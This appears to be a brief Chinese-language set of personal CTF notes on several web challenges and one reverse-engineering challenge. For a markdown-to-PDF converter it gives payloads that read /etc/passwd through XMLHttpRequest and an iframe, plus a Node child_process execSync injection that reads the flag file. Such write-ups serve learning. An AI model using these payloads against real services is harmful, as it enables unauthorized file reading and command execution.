# web
### Mythic PDF Forge
是一个md转pdf的网站,应该是利用渲染来读取本地文件
![image](https://i.imgur.com/ihETWie.png)
但是一加上file协议就加载不出来了
尝试过的payload
```html
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

```html
<iframe src=file:///etc/passwd height=800px weight=1200px ></iframe>
```
连签到都做不出来了

---
[md to pdf vuln](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) 信息收集背大锅
```js
((require("child_process")).execSync("cat /flag.txt"))
```


### Resty
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722214328.png)
一个大大的"Invalid route",然后就什么也不会了
### Payback
只有一个nginx首页,不会了
### Protobank
访问不到...

# reverse
### Catch the fox
好难,ida打不开,动调会卡住,x32dbg也不会

# pwn

# crypto

# Misc


---
# *相关wp*




2023-07-22   20:33